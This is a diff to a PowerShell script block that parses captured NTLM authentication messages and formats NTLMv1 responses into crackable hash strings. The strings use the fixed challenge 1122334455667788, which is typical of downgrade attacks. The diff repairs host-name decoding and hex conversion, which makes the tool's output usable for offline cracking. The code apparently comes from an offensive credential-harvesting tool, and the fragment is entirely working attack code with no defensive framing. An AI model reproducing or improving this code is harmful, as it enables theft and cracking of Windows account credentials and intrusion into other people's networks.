@@ -35,12 +35,20 @@ $NetNTLM_ScriptBlock = {
         $User_offset = [bitconverter]::ToInt16($NTLM,40)
         $User = $NTLM[$User_offset..($User_offset+$User_len-1)]
         $User = [System.Text.Encoding]::Unicode.GetString($User)
-        if ($NTHash_len -eq 24) { # NTLMv1
+        if ($NTHash_len -eq 24) {
+            # NTLMv1
             $HostName_len = [bitconverter]::ToInt16($NTLM,46)
             $HostName_offset = [bitconverter]::ToInt16($NTLM,48)
-            $HostName = $NTLM[$HostName_offset..($HostName_offset+$HostName_len-1)]
-            $retval = $User+"::"+$HostName+":"+$LMHash+":"+$NTHash+":1122334455667788"        
+            $HostName = $NTLM[$HostName_offset..($HostName_offset + $HostName_len - 1)]
+            $HostName = [System.Text.Encoding]::Unicode.GetString($HostName)
+
+            # Convert LMHash and NTHash to hexadecimal strings
+            $LMHashHex = [System.BitConverter]::ToString($LMHash).Replace("-", "")
+            $NTHashHex = [System.BitConverter]::ToString($NTHash).Replace("-", "")
+
+            $retval = "${User}::${HostName}:${LMHashHex}:${NTHashHex}:1122334455667788"
             return $retval
+    
         } elseif ($NTHash_len -gt 24) { # NTLMv2
             $NTHash_len = 64                    
             $Domain_len = [bitconverter]::ToInt16($NTLM,28)
